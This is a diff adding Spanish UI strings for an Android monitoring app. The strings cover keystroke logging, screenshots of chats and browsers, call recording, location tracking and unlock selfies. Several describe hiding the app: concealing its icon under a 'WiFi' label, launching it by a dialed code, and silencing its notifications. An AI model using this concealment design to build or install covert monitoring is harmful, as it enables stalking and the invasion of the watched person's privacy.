@@ -1,0 +1,372 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="abc_action_bar_home_description">Ir a la pantalla de inicio</string>
+    <string name="abc_action_bar_up_description">Desplazarse hacia arriba</string>
+    <string name="abc_action_menu_overflow_description">Más opciones</string>
+    <string name="abc_action_mode_done">Listo</string>
+    <string name="abc_activity_chooser_view_see_all">Ver todo</string>
+    <string name="abc_activitychooserview_choose_application">Seleccionar una aplicación</string>
+    <string name="abc_capital_off">DESACTIVADO</string>
+    <string name="abc_capital_on">ACTIVADO</string>
+    <string name="abc_menu_alt_shortcut_label">Alt +</string>
+    <string name="abc_menu_ctrl_shortcut_label">Ctrl +</string>
+    <string name="abc_menu_delete_shortcut_label">Eliminar</string>
+    <string name="abc_menu_enter_shortcut_label">Intro</string>
+    <string name="abc_menu_function_shortcut_label">Función +</string>
+    <string name="abc_menu_meta_shortcut_label">Meta +</string>
+    <string name="abc_menu_shift_shortcut_label">Mayús +</string>
+    <string name="abc_menu_space_shortcut_label">Espacio</string>
+    <string name="abc_menu_sym_shortcut_label">Sym +</string>
+    <string name="abc_prepend_shortcut_label">Menú +</string>
+    <string name="abc_search_hint">Buscar…</string>
+    <string name="abc_searchview_description_clear">Borrar consulta</string>
+    <string name="abc_searchview_description_query">Consulta</string>
+    <string name="abc_searchview_description_search">Buscar</string>
+    <string name="abc_searchview_description_submit">Enviar consulta</string>
+    <string name="abc_searchview_description_voice">Búsqueda por voz</string>
+    <string name="abc_shareactionprovider_share_with">Compartir con</string>
+    <string name="abc_shareactionprovider_share_with_application">Compartir con %s</string>
+    <string name="abc_toolbar_collapse_description">Contraer</string>
+    <string name="app_log_name">Apps</string>
+    <string name="check">Desinstale la versión antigua aquí</string>
+    <string name="chrome_search_text">Busca o escribe una dirección web</string>
+    <string name="dialog_allow_unknown_source">Para actualizar la aplicación, active \"Instalar apps desconocidas\".</string>
+    <string name="dialog_battery_optim">Por favor, desactiva Optimizar el uso de la batería para que la aplicación funcione correctamente</string>
+    <string name="dialog_battery_optim_on">¡La optimización de la batería aún está activada!</string>
+    <string name="dialog_battery_optim_set">":
+ - Cambiar \"No optimizado\" por \"Todas las aplicaciones\"
+ - Encuentra y desactiva la aplicación \"%1$s\"
+ - Toca el botón \"Atrás\""</string>
+    <string name="dialog_no">No</string>
+    <string name="dialog_ok">ACEPTAR</string>
+    <string name="dialog_perm_accessibility">Por favor, habilite el servicio de accesibilidad de la aplicación</string>
+    <string name="dialog_perm_accessibility_on">¡El servicio de accesibilidad a las aplicaciones sigue estando desactivado!</string>
+    <string name="dialog_perm_app">"Por favor, activa todos los permisos de la aplicación::
+ - Abrir la sección \"Permisos\"
+ - Activar todos los permisos"</string>
+    <string name="dialog_perm_app_off">¡Algunos permisos de aplicación siguen desactivados!</string>
+    <string name="dialog_perm_notif">Por favor, deshabilite las notificaciones de la aplicación</string>
+    <string name="dialog_perm_notif_on">¡Las notificaciones de la aplicación siguen estando habilitadas!</string>
+    <string name="dialog_perm_overlay">Por favor, activa el permiso \"Aparecer encima\" para activar las capturas de pantalla y selfi al desbloquear.</string>
+    <string name="dialog_perm_overlay_off">El permiso de \"Aparecer encima\" sigue desactivado!</string>
+    <string name="dialog_perm_read_notif">Por favor, permita que %1$s lea las notificaciones.</string>
+    <string name="dialog_perm_read_notif_off">¡El acceso para leer notificaciones aún está deshabilitado!</string>
+    <string name="dialog_perm_scr">"Por favor, permita a %1$s capturar la pantalla para obtener capturas de pantalla:
+ - Habilitar la opción \"No mostrar de nuevo
+   - Toca el botón \"Empezar ahora\""</string>
+    <string name="dialog_perm_scr_off">¡La captura de pantalla sigue desactivada!</string>
+    <string name="dialog_perm_usage">"Por favor, activa el permiso de \"Acceso a datos de uso\" para obtener capturas de pantalla:
+ - Encuentra y toca la aplicación \"%1$s\"
+ - Habilitar el acceso de uso
+ - Toca el botón \"Atras\" dos veces"</string>
+    <string name="dialog_perm_usage_off">¡El permiso de \"Acceso a los datos de uso\" sigue desactivado!</string>
+    <string name="dialog_pin_current">PIN actual</string>
+    <string name="dialog_pin_retype">Vuelve a escribir el PIN</string>
+    <string name="dialog_pin_specify">Nuevo PIN</string>
+    <string name="dialog_run_app">Para abrir el dial de aplicación oculta:</string>
+    <string name="dialog_run_app_sticker">Para abrir la aplicación oculta, usa el widget \"Sticker\"</string>
+    <string name="dialog_uninstall_ask">¿Quieres desinstalar Monitor?</string>
+    <string name="dialog_update">Actualización</string>
+    <string name="dialog_wait">Por favor, espera…</string>
+    <string name="dialog_yes">Sí</string>
+    <string name="email_msg_alarm">La suscripción expira después de %1$s.</string>
+    <string name="email_msg_alarm_renew">"
+Por favor, renueve su suscripción."</string>
+    <string name="email_msg_alarm_stop">La suscripción ha expirado.</string>
+    <string name="email_msg_alarm_stop_logs">Los informes pagados serán descartados a menos que inicie una suscripción.</string>
+    <string name="event_count">Cuenta</string>
+    <string name="event_name">Evento</string>
+    <string name="facebook_active">activo</string>
+    <string name="facebook_add_your_story">Tu historia</string>
+    <string name="facebook_call">Llamada con</string>
+    <string name="facebook_chat_head_with">"Burbuja de chat con "</string>
+    <string name="facebook_datetime_format">"d MMM 'A LAS' h:mm a"</string>
+    <string name="facebook_datetime_format24">"d MMM 'A LAS' HH:mm"</string>
+    <string name="facebook_friends">en Facebook</string>
+    <string name="facebook_full_datetime_format">"d MMMM. yyyy 'A LAS' h:mm a"</string>
+    <string name="facebook_full_datetime_format24">"d MMMM. yyyy 'A LAS' HH:mm"</string>
+    <string name="facebook_goto_last_msg">Ir al mensaje más reciente</string>
+    <string name="facebook_open_profile">Abrir menú del perfil</string>
+    <string name="facebook_thread_details">Información de la cadena de mensajes</string>
+    <string name="facebook_time_ago">hace</string>
+    <string name="facebook_time_now">ahora</string>
+    <string name="facebook_unread">No leído:</string>
+    <string name="facebook_weekdaytime_format">"EEE 'A LAS' h:mm a"</string>
+    <string name="facebook_weekdaytime_format24">"EEE 'A LAS' HH:mm"</string>
+    <string name="facebook_you">Tú:</string>
+    <string name="firefox_search_text">Término de búsqueda o dirección</string>
+    <string name="general_password">Por favor, introduzca su PIN</string>
+    <string name="global_settings_name">Ajustes</string>
+    <string name="gm_now">Ahora</string>
+    <string name="hangouts_call">Llamada de voz de</string>
+    <string name="hangouts_conversation">Conversación:</string>
+    <string name="hangouts_date_format_with_year">dd/MM/yyyy h:mm a</string>
+    <string name="hangouts_date_format_with_year_24">dd/MM/yyyy HH:mm</string>
+    <string name="hangouts_from">"de "</string>
+    <string name="hangouts_minute">minuto</string>
+    <string name="hangouts_right_now">Ahora</string>
+    <string name="hangouts_second">segundo</string>
+    <string name="hangouts_seen_by">"Vista por "</string>
+    <string name="hangouts_simple_date_format">"d 'de' MMMM h:mm a"</string>
+    <string name="hangouts_simple_date_format_24">"d 'de' MMMM HH:mm"</string>
+    <string name="hangouts_wait">Llamando a %1$s…</string>
+    <string name="hangouts_week_date_format">EEEE h:mm a</string>
+    <string name="hangouts_week_date_format_24">EEEE HH:mm</string>
+    <string name="hint_change_pin_new">Introducir PIN nuevo</string>
+    <string name="hint_enter_pin">Introducir PIN</string>
+    <string name="hint_sms_hiden">[Oculto]</string>
+    <string name="ignore">Sáltar este paso</string>
+    <string name="im_log_name">MI</string>
+    <string name="inst_accessibility_activate_action">ENCENDER SERVICIO</string>
+    <string name="inst_accessibility_browsers_list">Chrome, Opera, Firefox, Samsung, Mint, ASUS</string>
+    <string name="inst_accessibility_caption">Seleccione las actividades adicionales para rastrear</string>
+    <string name="inst_accessibility_chats">Mensajes de chat</string>
+    <string name="inst_accessibility_chats_list">WhatsApp, Facebook Messenger, Viber, Hangouts</string>
+    <string name="inst_accessibility_hint">"Para tener acceso al contenido de la pantalla es necesario activar el servicio de accesibilidad:
+Elija la aplicación '%1$s' en la lista y actívela. Vuelva a esta página. (El sistema puede cerrar la aplicación en este momento)"</string>
+    <string name="inst_accessibility_sites">Historial de sitios web</string>
+    <string name="inst_call_recording">Grabaciones de llamadas telefónicas</string>
+    <string name="inst_chat_recording">Grabaciones de llamadas de chats</string>
+    <string name="inst_chose_device_type">Por favor, elige el tipo de dispositivo</string>
+    <string name="inst_enable_location_access">La aplicación requiere acceso a la ubicación:\\n\\n1. Busque y toque la configuración \"Permisos\".\\n2. Busque y toque la configuración \"Ubicación\".\\n3. Habilite: \"Permitir todo el tiempo\".</string>
+    <string name="inst_finish_action">Terminar la instalación</string>
+    <string name="inst_finish_caption">Configuración completada</string>
+    <string name="inst_finish_hint">"Terminar la instalación!
+Vea los registros de su cuenta."</string>
+    <string name="inst_hello_cancel">Cancelar la instalación</string>
+    <string name="inst_hello_caption">Hacer que este dispositivo sea monitoreable</string>
+    <string name="inst_hello_hint">Si tiene la intención de monitorear este dispositivo, entonces necesita completar todos los pasos de configuración. Asegúrate de tener una cuenta registrada y presiona SIGUIENTE.</string>
+    <string name="inst_license_caption">Acuerdo de licencia de usuario final</string>
+    <string name="inst_log_select_all">Todas las actividades</string>
+    <string name="inst_log_select_apps">Apps</string>
+    <string name="inst_log_select_calendar">Calendario</string>
+    <string name="inst_log_select_calls">Registros de llamadas</string>
+    <string name="inst_log_select_caption">Actividades del dispositivo para rastrear</string>
+    <string name="inst_log_select_contacts">Contactos</string>
+    <string name="inst_log_select_gallery">Galería</string>
+    <string name="inst_log_select_hint">Si dejas algunas opciones sin marcar, no podrás activarlas a distancia. Necesitarías acceso físico a un dispositivo.</string>
+    <string name="inst_log_select_location">Ubicación</string>
+    <string name="inst_log_select_sms">SMS/MMS</string>
+    <string name="inst_log_select_system">Eventos del sistema</string>
+    <string name="inst_log_select_system_hint">(Información sobre la SIM, la batería y las redes)</string>
+    <string name="inst_log_select_unlock">Foto al desbloquear</string>
+    <string name="inst_log_typed_text">Texto escrito</string>
+    <string name="inst_login_activate">Activar</string>
+    <string name="inst_login_caption">Por favor, introduce tus credenciales</string>
+    <string name="inst_login_forgot_password">¿Contraseña olvidada?</string>
+    <string name="inst_login_hint_email">Introducir correo electrónico</string>
+    <string name="inst_login_hint_password">Introducir contraseña</string>
+    <string name="inst_old_version_found">Por favor, desinstale la(s) siguiente(s) versión(es) antigua(s) para evitar posibles errores:</string>
+    <string name="inst_pin_caption">Configurar PIN</string>
+    <string name="inst_pin_change">Cambiar PIN</string>
+    <string name="inst_pin_change_hint">PIN</string>
+    <string name="inst_pin_change_icon">Android restringe la ocultación de iconos de aplicaciones. La aplicación aparecerá en un dispositivo debajo del icono «WiFi».</string>
+    <string name="inst_pin_hide_app">Ocultar icono de la aplicación</string>
+    <string name="inst_pin_hint">La aplicación puede ser lanzada marcando ***%1$s###</string>
+    <string name="inst_pin_turn_on">Proteger la aplicación por medio de un PIN</string>
+    <string name="inst_rec_warning">Es posible que las llamadas no se graben correctamente en algunos modelos de teléfonos Android</string>
+    <string name="inst_requiremens_a11y">Servicio de Accesibilidad</string>
+    <string name="inst_requiremens_a11y_hint">Se requiere un servicio de accesibilidad para proporcionar funciones de vigilancia ampliadas.</string>
+    <string name="inst_requiremens_a11y_instruction">"1. Toca Servicios instalados (descargados).
+ 2. Toca '%1$s'.
+ 3. Activa el interruptor y toca Permitir.
+ 4. Pulse el botón ATRAS del sistema hasta volver a esta página."</string>
+    <string name="inst_requiremens_a11y_instruction_14">"
+
+ Si la activación del servicio está bloqueada, abra Configuración>Aplicaciones>'%1$s', busque \"Permitir configuraciones restringidas\" y actívela. Si no está en la configuración, haga clic en los 3 puntos en la esquina superior derecha, luego enciéndalo y luego repita la activación del servicio."</string>
+    <string name="inst_requiremens_a11y_instruction_header">Para activar el servicio de accesibilidad:</string>
+    <string name="inst_requiremens_basic">Permisos básicos</string>
+    <string name="inst_requiremens_basic_hint">La aplicación requiere acceso al almacenamiento, a la configuración del teléfono, a los registros de llamadas y a los contactos.</string>
+    <string name="inst_requiremens_basic_instruction">"1. Encuentra y toca la configuración de 'Permisos'.
+
+2. Habilitar:
+\u0009- Contactos
+\u0009- Teléfono
+\u0009- Almacenamiento
+
+3. Pulse el botón ATRAS del sistema hasta volver a esta página."</string>
+    <string name="inst_requiremens_basic_instruction_26">"1. Encuentra y toca la configuración de 'Permisos'.
+
+2. Habilitar:
+\u0009- Registros de llamadas
+\u0009- Contactos
+\u0009- Teléfono
+\u0009- Almacenamiento
+
+3. Pulse el botón ATRAS del sistema hasta volver a esta página."</string>
+    <string name="inst_requiremens_basic_instruction_header">Para permitir los permisos:</string>
+    <string name="inst_requiremens_battery">Desactivar la optimización de la batería</string>
+    <string name="inst_requiremens_battery_hint">Deje que la aplicación funcione siempre en segundo plano (Optimización de la batería DESACTIVADA) para evitar que la aplicación se detenga debido al ahorro de batería</string>
+    <string name="inst_requiremens_caption">Requisitos de solicitud</string>
+    <string name="inst_requiremens_everything_ready">¡Ya casi está! ¡Sólo unos pocos pasos más!</string>
+    <string name="inst_requiremens_files_access_header">Para permitir el acceso al almacenamiento:</string>
+    <string name="inst_requiremens_files_access_instruction">1. Desplácese por la lista hasta que vea la aplicación <b>"'%1$s'"</b>".
+
+2. "<b>Active</b>" el interruptor para otorgar permiso.
+
+3. Toque el botón "<b>ATRÁS</b> del sistema hasta regresar a esta página.</string>
+    <string name="inst_requiremens_hint">Por favor, habilite todas las opciones listadas para que la aplicación funcione correctamente</string>
+    <string name="inst_requiremens_notifications">Desactivar las notificaciones de la aplicación</string>
+    <string name="inst_requiremens_notifications_access">Acceso a notificaciones</string>
+    <string name="inst_requiremens_notifications_access_hint">Este permiso permite leer notificaciones.</string>
+    <string name="inst_requiremens_notifications_access_instruction">1. Desplácese por la lista hasta que vea la aplicación <b>"'%1$s'"</b>". 
+
+2. "<b>Active</b>" el interruptor para otorgar permiso. 
+
+3. "<b>Toca</b> <b>Permitir</b>". 
+
+4. Toque el botón "<b>ATRÁS</b> del sistema hasta regresar a esta página.</string>
+    <string name="inst_requiremens_notifications_access_instruction_header">Para permitir el acceso a las notificaciones:</string>
+    <string name="inst_requiremens_notifications_hint">Las notificaciones de esta aplicación deben ser desactivadas ya que pueden ser demasiado molestas.</string>
+    <string name="inst_requiremens_notifications_instruction">"1. Encuentra y toca el ajuste de 'Notificaciones'.
+
+2. "<b>Desactiva</b>" switch principal.
+
+3. Pulse el botón "<b>ATRAS</b> del sistema hasta que vuelvas a esta página.</string>
+    <string name="inst_requiremens_notifications_instruction_26">1. <b>DESACTIVA</b>" la opción 'Mostrar notificaciones'.
+
+2. Pulse el botón "<b>ATRAS</b> del sistema para volver a esta página.</string>
+    <string name="inst_requiremens_notifications_instruction_header">Para desactivar las notificaciones de esta aplicación:</string>
+    <string name="inst_requiremens_overlay">Permiso de superposición</string>
+    <string name="inst_requiremens_overlay_hint">La aplicación debería poder mostrarse encima de otras aplicaciones.</string>
+    <string name="inst_requiremens_usage">Acceso al uso</string>
+    <string name="inst_requiremens_usage_hint">Este permiso permite rastrear la actividad de otras aplicaciones.</string>
+    <string name="inst_requiremens_usage_instruction">1. Desplácese por la lista hasta que vea la aplicación <b>"'%1$s'"</b>" .
+
+2. "<b>Toca</b>" la aplicación.
+
+3. "<b>Activa</b>" para conceder permiso.
+
+4. Pulse el botón "<b>ATRAS</b> del sistema hasta que vuelvas a esta página.</string>
+    <string name="inst_requiremens_usage_instruction_header">Para permitir el acceso al uso:</string>
+    <string name="inst_screenshots_caption">¿Qué tipo de capturas de pantalla le gustaría grabar?</string>
+    <string name="inst_screenshots_hint">"Tienes que permitir que la aplicación haga capturas de pantalla sin futuras confirmaciones. Configura la casilla de verificación 'No mostrar de nuvo' en el diálogo de solicitud de permiso y presiona el botón INICIAR AHORA."</string>
+    <string name="inst_screenshots_im">de los Mensajeros Instantáneos</string>
+    <string name="inst_screenshots_sms">de SMS/MMS</string>
+    <string name="inst_screenshots_timer">Cronometrada, de la actividad actual</string>
+    <string name="inst_screenshots_title">Capturas de pantalla:</string>
+    <string name="inst_screenshots_web">de los navegadores web</string>
+    <string name="inst_type_caption">Por favor, confirme que esta aplicación será utilizada correctamente</string>
+    <string name="inst_type_confirmation">Confirmo que el usuario de este dispositivo está informado sobre el software de monitoreo y tengo su acuerdo explícito</string>
+    <string name="inst_type_employee">Dispositivo para empleados</string>
+    <string name="inst_type_intention">Voy a usar este software para monitorear:</string>
+    <string name="inst_type_kids">Dispositivo de mi hijo</string>
+    <string name="inst_type_own">Mi propio dispositivo</string>
+    <string name="license_accept">Acepto</string>
+    <string name="license_read">He leído y entendido los términos</string>
+    <string name="license_text"><b>1.</b>" Es consciente de que este software puede grabar, almacenar y transmitir información sobre el uso del dispositivo y su actividad de usuario. 
+ 
+"<b>2.</b>" Se le permite usar este software sólo bajo las siguientes condiciones: 
+Estás usando este software en un dispositivo que posees y usas personalmente; 
+Tiene el consentimiento explícito y por escrito del propietario y de todos los usuarios del dispositivo a ser monitoreado; 
+Eres el tutor legal del usuario del dispositivo a ser monitoreado; 
+ 
+"<b>3.</b> Conoce y cumple con las leyes y reglamentos que cubren la privacidad, la confidencialidad y el uso de dicho software de vigilancia en su jurisdicción. Asume la plena responsabilidad de la instalación o el uso del software. Los desarrolladores, vendedores o distribuidores del software no pueden ser considerados responsables de ninguna violación o consecuencia legal que resulte de la instalación o uso del software por parte de usted.</string>
+    <string name="log_files_name">Galería</string>
+    <string name="log_name_audio">Audio</string>
+    <string name="log_name_file">Archivo</string>
+    <string name="log_name_gif">Gif</string>
+    <string name="log_name_image">Imagen</string>
+    <string name="log_name_sticker">Sticker</string>
+    <string name="log_name_video">Vídeo</string>
+    <string name="menu_change_email">Cambiar configuración del correo electrónico</string>
+    <string name="menu_change_pin">Cambiar el PIN de la aplicación</string>
+    <string name="menu_check_app_state">Revisar los permisos de la aplicación</string>
+    <string name="menu_check_update">Busca las actualizaciones</string>
+    <string name="menu_clear">Limpiar los registros locales</string>
+    <string name="menu_close">Cerrar</string>
+    <string name="menu_disable_pin_protection">Desactivar protección PIN</string>
+    <string name="menu_enable_pin_protection">Habilitar protección PIN</string>
+    <string name="menu_hide_icon">Esconder el icono de %1$s</string>
+    <string name="menu_reset_app_perm">Restablecer permisos de la aplicación</string>
+    <string name="menu_reset_license">Reajuste la licencia</string>
+    <string name="menu_select_source">Cambiar fuente de audio</string>
+    <string name="menu_show_icon">Mostrar el icono de %1$s</string>
+    <string name="menu_uninstall">Desinstalar</string>
+    <string name="module_calendar">Eventos del calendario</string>
+    <string name="module_calls">Llama a</string>
+    <string name="module_contacts">Contactos</string>
+    <string name="module_location">Ubicación</string>
+    <string name="module_mms">MMS</string>
+    <string name="module_photo">Selfi al desbloquear</string>
+    <string name="module_screen_shot">Capturas de pantalla</string>
+    <string name="module_sim">Cambiar la tarjeta SIM</string>
+    <string name="module_sms">SMS</string>
+    <string name="module_web">Los sitios web visitados</string>
+    <string name="next">siguiente</string>
+    <string name="opera_search_text">Buscar o escribir dirección</string>
+    <string name="search_menu_title">Buscar</string>
+    <string name="skype_call">LLAMANDO</string>
+    <string name="skype_call_cancel">Descartar</string>
+    <string name="skype_call_conn">CONECTANDO</string>
+    <string name="skype_call_end">Finalizar llamada</string>
+    <string name="skype_start">"Reproducir mensaje de audio, "</string>
+    <string name="skype_stop">Pausar el mensaje de audio</string>
+    <string name="status_Version">Versión de aplicación:</string>
+    <string name="status_activated">Activación</string>
+    <string name="status_bar_notification_info_overflow">+999</string>
+    <string name="status_internet_connection">No hay conexión a Internet</string>
+    <string name="status_last_send">Última carga de datos:</string>
+    <string name="status_last_sync">Última conexión:</string>
+    <string name="status_memory_usage">El uso de la memoria</string>
+    <string name="status_monitor_disabled">Monitor desactivado</string>
+    <string name="status_monitor_enabled">Monitor activado</string>
+    <string name="status_record">Grabar</string>
+    <string name="status_send_data_period">Período de carga de datos</string>
+    <string name="status_server_connected">Conectado</string>
+    <string name="status_valid">válido a través de</string>
+    <string name="status_wifi">sólo Wi-Fi</string>
+    <string name="telegram_date_format_full">"d 'de' MMM 'de' yyyy"</string>
+    <string name="telegram_date_format_short">"d 'de' MMM"</string>
+    <string name="telegram_got">Recibido el a las</string>
+    <string name="telegram_got_ans1">Tiene</string>
+    <string name="telegram_got_ans2">respuestas</string>
+    <string name="telegram_loaded">descargado</string>
+    <string name="telegram_pause">Pausar</string>
+    <string name="telegram_sending">Enviando</string>
+    <string name="telegram_sent">Enviado a las</string>
+    <string name="telegram_video">Video</string>
+    <string name="telegram_viewed">Visto</string>
+    <string name="telegram_voice">Mensaje de voz</string>
+    <string name="text_log_name">Texto escrito</string>
+    <string name="time_day">d.</string>
+    <string name="time_hrs">h.</string>
+    <string name="time_min">m.</string>
+    <string name="time_sec">s.</string>
+    <string name="title_activity_installer">Instalador</string>
+    <string name="toast_digit_pin">El PIN debe contener sólo dígitos</string>
+    <string name="toast_empty_email">Introduce correo electrónico de cuenta</string>
+    <string name="toast_empty_password">Introduce contraseña de cuenta</string>
+    <string name="toast_empty_pin">Introduce PIN de aplicación</string>
+    <string name="toast_error_activation">Error de activación</string>
+    <string name="toast_hide_icon">El icono de %1$s será escondido después de cerrar la aplicación.</string>
+    <string name="toast_length_pin">El PIN debe contener sólo 4 dígitos</string>
+    <string name="toast_license_limit">error de licencia.</string>
+    <string name="toast_license_locked">licencia bloqueada.</string>
+    <string name="toast_logs_cleared">Los registros locales se han limpiado con éxito</string>
+    <string name="toast_no_inet">Por favor, compruebe la conexión a Internet</string>
+    <string name="toast_not_same_pin">Los códigos PIN no coinciden</string>
+    <string name="toast_pin_changed">El PIN se cambió con éxito</string>
+    <string name="toast_server_not_available">El servidor no está disponible. Comprueba la conexión a Internet o inténtalo de nuevo más tarde.</string>
+    <string name="toast_show_icon">El icono de %1$s será visible después de cerrar la aplicación.</string>
+    <string name="toast_unkn_err">error desconocido:</string>
+    <string name="toast_wrong_account_or_password">Correo electrónico o contraseña de la cuenta incorrectos.</string>
+    <string name="toast_wrong_pin">PIN incorrecto</string>
+    <string name="today">Hoy</string>
+    <string name="update_current_version">Versión actual: %1$s</string>
+    <string name="update_new_version">Nueva versión: %1$s</string>
+    <string name="update_status_error_disable_link">El enlace de actualización no está disponible. Por favor, inténtelo de nuevo más tarde</string>
+    <string name="update_status_error_disable_server">El servidor no está disponible. Compruebe su conexión a Internet</string>
+    <string name="update_status_error_download">Error al cargar las actualizaciones</string>
+    <string name="update_status_ok_check_link">Verificando el enlace de actualización</string>
+    <string name="update_status_ok_check_server">Verificando el acceso al servidor.</string>
+    <string name="update_status_ok_download_update">Descargando actualizaciones…</string>
+    <string name="update_status_ok_install">Instalando actualizaciones…</string>
+    <string name="viber_change">Editar</string>
+    <string name="viber_date_format_full">d/M/yy</string>
+    <string name="whatsapp_date_format_full">"d 'DE' MMMM 'DE' yyyy"</string>
+    <string name="widget_enter_note">Introduce el texto</string>
+    <string name="widget_hint">Pulse para introducir el texto</string>
+    <string name="widget_name">Sticker</string>
+    <string name="yesterday">Ayer</string>
+</resources>
